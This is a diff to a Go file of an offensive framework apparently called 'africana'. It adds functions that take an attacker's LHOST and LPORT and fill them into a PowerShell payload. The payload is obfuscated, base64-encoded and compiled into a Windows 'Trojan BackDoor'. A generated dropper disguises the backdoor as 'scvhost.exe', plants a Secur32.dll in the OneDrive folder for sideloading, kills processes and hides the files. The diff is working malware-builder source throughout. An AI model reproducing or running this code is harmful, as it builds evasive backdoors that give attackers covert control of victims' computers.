@@ -3,12 +3,17 @@ package butchers
 import (
     "os"
     "fmt"
+    "log"
     "utils"
     "bufio"
+    "bytes"
     "banners"
     "strings"
     "bcolors"
+    "io/ioutil"
     "subprocess"
+    "unicode/utf16"
+    "encoding/base64"
 )
 
 var(
@@ -22,6 +27,238 @@ var(
     userOutput  string
     reader = bufio.NewReader(os.Stdin)
 )
+
+func NoiseMaker() {
+    fmt.Printf(bcolors.BLUE + "\n╭─(" + bcolors.ENDC + "africana:" + bcolors.DARKCYAN + "framework: " + bcolors.ENDC + bcolors.ITALIC + "use" + bcolors.ENDC + ": " + bcolors.BLUE + bcolors.ITALIC + "1. " + bcolors.YELLOW + "TCP " + bcolors.BLUE + "2. " + bcolors.YELLOW + "HTTPS " + bcolors.BLUE + "or " + bcolors.BLUE + "0. " + bcolors.PURPLE + "Go back" + bcolors.BLUE + ")" + bcolors.ENDC)
+    fmt.Printf(bcolors.BLUE + "\n╰─🐭" + bcolors.GREEN + "❯ " + bcolors.ENDC)
+    userInput, _ := reader.ReadString('\n')
+    userInput = strings.TrimSpace(userInput)
+    if userInput == "" {
+        userInput = "1"
+    }
+    switch userInput {
+    case "0":
+        return
+    case "1":
+        userLhostIp, err := utils.GetDefaultIP()
+        if err != nil {
+            fmt.Printf(bcolors.BLUE + "[+] " + bcolors.RED + "Error getting default userLhostIp:", err)
+            os.Exit(1)
+        }
+        fmt.Println()
+        subprocess.Popen(`ip address`)
+        fmt.Printf(bcolors.BLUE + "\n╭─(" + bcolors.ENDC + "africana:" + bcolors.DARKCYAN + "framework: " + bcolors.ENDC + bcolors.ITALIC + "set " + bcolors.RED + "LHOST " + bcolors.PURPLE + "default " + bcolors.ENDC + "= " + bcolors.YELLOW + bcolors.ITALIC + "%s", userLhostIp + bcolors.ENDC + bcolors.BLUE + ")" + bcolors.ENDC)
+        fmt.Printf(bcolors.BLUE + "\n╰─🐭" + bcolors.GREEN + "❯ " + bcolors.ENDC)
+        userLhost, _ := reader.ReadString('\n')
+        userLhost = strings.TrimSpace(userLhost)
+        if userLhost == "" {
+            userLhost = userLhostIp
+        }
+        fmt.Printf(bcolors.BLUE + "\n╭─(" + bcolors.ENDC + "africana:" + bcolors.DARKCYAN + "framework: " + bcolors.ENDC + bcolors.ITALIC + "set " + bcolors.RED + "LPORT " + bcolors.PURPLE + "default " + bcolors.ENDC + "= " + bcolors.YELLOW + bcolors.ITALIC + "9999" + bcolors.ENDC + bcolors.BLUE + ")" + bcolors.ENDC)
+        fmt.Printf(bcolors.BLUE + "\n╰─🐭" + bcolors.GREEN + "❯ " + bcolors.ENDC)
+        userLport, _ := reader.ReadString('\n')
+        userLport = strings.TrimSpace(userLport)
+        if userLport == "" {
+            userLport = "9999"
+        }
+        subprocess.Popen(`cp -r /root/.africana/africana-base/africana-bines/noisemaker.ps1 /root/.africana/output/noisemaker.txt`)
+        filesToReplacements := map[string]map[string]string{
+            "/root/.africana/output/noisemaker.txt": {
+            `*LHOST*`: userLhost,
+            `*LPORT*`: userLport,
+            },
+        }
+        fmt.Println()
+        utils.Editors(filesToReplacements)
+        userScript := `/root/.africana/output/noisemaker.txt`
+        userOutput := `/root/.africana/output/noisemaker.ps1`
+        subprocess.Popen(`cd /root/.africana/africana-base/chameleon/; pwsh -c "Import-Module ./chameleon.ps1; Invoke-PSObfuscation -Path %s -Aliases -Cmdlets -Comments -Pipes -PipelineVariables -ShowChanges -o %s"`, userScript, userOutput)
+    case "2":
+        userLhostIp, err := utils.GetDefaultIP()
+        if err != nil {
+            fmt.Printf(bcolors.BLUE + "[+] " + bcolors.RED + "Error getting default userLhostIp:", err)
+            os.Exit(1)
+        }
+        fmt.Println()
+        subprocess.Popen(`ip address`)
+        fmt.Printf(bcolors.BLUE + "\n╭─(" + bcolors.ENDC + "africana:" + bcolors.DARKCYAN + "framework: " + bcolors.ENDC + bcolors.ITALIC + "set " + bcolors.RED + "LHOST " + bcolors.PURPLE + "default " + bcolors.ENDC + "= " + bcolors.YELLOW + bcolors.ITALIC + "%s", userLhostIp + bcolors.ENDC + bcolors.BLUE + ")" + bcolors.ENDC)
+        fmt.Printf(bcolors.BLUE + "\n╰─🐭" + bcolors.GREEN + "❯ " + bcolors.ENDC)
+        userLhost, _ := reader.ReadString('\n')
+        userLhost = strings.TrimSpace(userLhost)
+        if userLhost == "" {
+            userLhost = userLhostIp
+        }
+        fmt.Printf(bcolors.BLUE + "\n╭─(" + bcolors.ENDC + "africana:" + bcolors.DARKCYAN + "framework: " + bcolors.ENDC + bcolors.ITALIC + "set " + bcolors.RED + "LPORT " + bcolors.PURPLE + "default " + bcolors.ENDC + "= " + bcolors.YELLOW + bcolors.ITALIC + "9999" + bcolors.ENDC + bcolors.BLUE + ")" + bcolors.ENDC)
+        fmt.Printf(bcolors.BLUE + "\n╰─🐭" + bcolors.GREEN + "❯ " + bcolors.ENDC)
+        userLport, _ := reader.ReadString('\n')
+        userLport = strings.TrimSpace(userLport)
+        if userLport == "" {
+            userLport = "9999"
+        }
+        subprocess.Popen(`cp -r /root/.africana/africana-base/africana-bines/noisemaker.ps1 /root/.africana/output/noisemaker.txt`)
+        filesToReplacements := map[string]map[string]string{
+            "/root/.africana/output/noisemaker.txt": {
+            `LHOST =`: userLhost,
+            `LPORT =`: userLport,
+            },
+        }
+        utils.Editors(filesToReplacements)
+        userScript := `/root/.africana/output/noisemaker.txt`
+        userOutput := `/root/.africana/output/noisemaker.ps1`
+        subprocess.Popen(`cd /root/.africana/africana-base/chameleon/; pwsh -c "Import-Module ./chameleon.ps1; Invoke-PSObfuscation -Path %s -Aliases -Cmdlets -Comments -Pipes -PipelineVariables -ShowChanges -o %s"`, userScript, userOutput)
+    default:
+        fmt.Println(bcolors.BLUE + "( " + bcolors.RED + "Poor choice of selection. Please select from " + bcolors.YELLOW + "> " + bcolors.BLUE + "(" + bcolors.DARKCYAN + " 0 to 2 " + bcolors.BLUE + ")" + bcolors.ENDC)
+    }
+    NoiseCompiler()
+}
+
+func NoiseCompiler() {
+    filePath := "/root/.africana/output/noisemaker.ps1"
+    content, err := ioutil.ReadFile(filePath)
+    if err != nil {
+        fmt.Printf("Error reading file: %v\n", err)
+        return
+    }
+
+    utf16Content := utf16.Encode([]rune(string(content)))
+    buf := new(bytes.Buffer)
+    for _, v := range utf16Content {
+        buf.Write([]byte{byte(v), byte(v >> 8)})
+    }
+
+    encoded := base64.StdEncoding.EncodeToString(buf.Bytes())
+
+    subprocess.Popen(`cp -r /root/.africana/africana-base/africana-bines/noisemaker.go /root/.africana/output/noisemakers.go`)
+    filesToReplacements := map[string]map[string]string{
+        "/root/.africana/output/noisemakers.go": {
+        `NoiseMakers`: encoded,
+        },
+    }
+    utils.Editors(filesToReplacements)
+    fmt.Printf(bcolors.BLUE + "\nBase64 Encoded PS1 Script:" + bcolors.DARKGREEN + "\n%s" + bcolors.ENDC, encoded)
+    fmt.Printf(bcolors.BLUE + "\n\nBuilding the Trojan BackDoor:\n" + bcolors.ENDC)
+    subprocess.Popen(`GOOS=windows GOARCH=amd64 go build -o /root/.africana/output/noises.exe /root/.africana/output/noisemakers.go`)
+    NoiseBuilder()
+}
+
+func NoiseBuilder() {
+    binaryFilePath := "/root/.africana/africana-base/africana-bines/Secur32.dll"
+    exeFilePath := "/root/.africana/output/noises.exe"
+
+    binaryData, err := ioutil.ReadFile(binaryFilePath)
+    if err != nil {
+        log.Fatalf("Failed reading binary file: %s", err)
+    }
+
+    exeData, err := ioutil.ReadFile(exeFilePath)
+    if err != nil {
+        log.Fatalf("Failed reading executable file: %s", err)
+    }
+
+    encodedBinary := base64.StdEncoding.EncodeToString(binaryData)
+    encodedExe := base64.StdEncoding.EncodeToString(exeData)
+
+    goCodeTemplate := `
+package main
+
+import (
+    "encoding/base64"
+    "fmt"
+    "log"
+    "os"
+    "os/exec"
+    "path/filepath"
+    "runtime"
+)
+
+var (
+    shell string
+    flag  string
+)
+
+func init() {
+    switch runtime.GOOS {
+    case "windows":
+        shell = "cmd"
+        flag = "/c"
+    default:
+        shell = "bash"
+        flag = "-c"
+    }
+}
+
+func Popen(command string, args ...interface{}) error {
+    cmd := fmt.Sprintf(command, args...)
+    process := exec.Command(shell, flag, cmd)
+    process.Stdin = os.Stdin
+    process.Stdout = nil
+    process.Stderr = nil
+
+    return process.Run()
+}
+
+func main() {
+    encodedExeData := "%s"
+    encodedBinaryData := "%s"
+
+    exeData, err := base64.StdEncoding.DecodeString(encodedExeData)
+    if err != nil {
+        log.Fatalf("Failed decoding Base64 executable string: %%s", err)
+    }
+
+    binaryData, err := base64.StdEncoding.DecodeString(encodedBinaryData)
+    if err != nil {
+        log.Fatalf("Failed decoding Base64 binary string: %%s", err)
+    }
+
+    exeOutputPath := "C:\\Users\\Public\\Libraries\\scvhost.exe"
+    binaryOutputPath := filepath.Join(os.Getenv("USERPROFILE"), "AppData\\Local\\Microsoft\\OneDrive\\Secur32.dll")
+
+    paths := []string{exeOutputPath, binaryOutputPath}
+    for _, path := range paths {
+        if _, err := os.Stat(path); !os.IsNotExist(err) {
+            if err := os.Remove(path); err != nil {
+                //log.Printf("Failed to remove file: %%s", err)
+                Popen("taskkill /im OneDrive.exe /im scvhost.exe /f")
+                os.Remove(path)
+            }
+        }
+    }
+
+    if err := os.WriteFile(exeOutputPath, exeData, 0644); err != nil {
+        log.Fatalf("Failed to write file: %%s", err)
+    }
+
+    if err := os.WriteFile(binaryOutputPath, binaryData, 0644); err != nil {
+        log.Fatalf("Failed to write file: %%s", err)
+    }
+
+    Popen("attrib +h %%s", exeOutputPath)
+    Popen("attrib +h %%s", binaryOutputPath)
+}
+`
+    goCode := fmt.Sprintf(goCodeTemplate, encodedExe, encodedBinary)
+    outputFilePath := "/root/.africana/output/noisemaker_code.go"
+
+    if err := ioutil.WriteFile(outputFilePath, []byte(goCode), 0644); err != nil {
+        log.Fatalf("Failed writing generated Go code: %s", err)
+    }
+
+    if err := os.Setenv("GOOS", "windows"); err != nil {
+        log.Fatalf("Failed to set GOOS environment variable: %s", err)
+    }
+    if err := os.Setenv("GOARCH", "amd64"); err != nil {
+        log.Fatalf("Failed to set GOARCH environment variable: %s", err)
+    }
+
+    executablePath := "/root/.africana/output/africana_backdoor.exe"
+    buildCmd := "go build -x -v -o %s %s"
+
+    formattedCmd := fmt.Sprintf(buildCmd, executablePath, outputFilePath)
+    subprocess.Popen(formattedCmd)
+    //subprocess.Popen(`rm -rf /root/.africana/output/noise*`)
+    log.Printf(bcolors.BLUE + "\n\nPersisternt BackDoor: " + bcolors.DARKGREEN + "Saved at " + bcolors.RED + "%s", executablePath)
+}
 
 func Havoc() {
     subprocess.Popen(`havoc client & havoc server -d -v`)
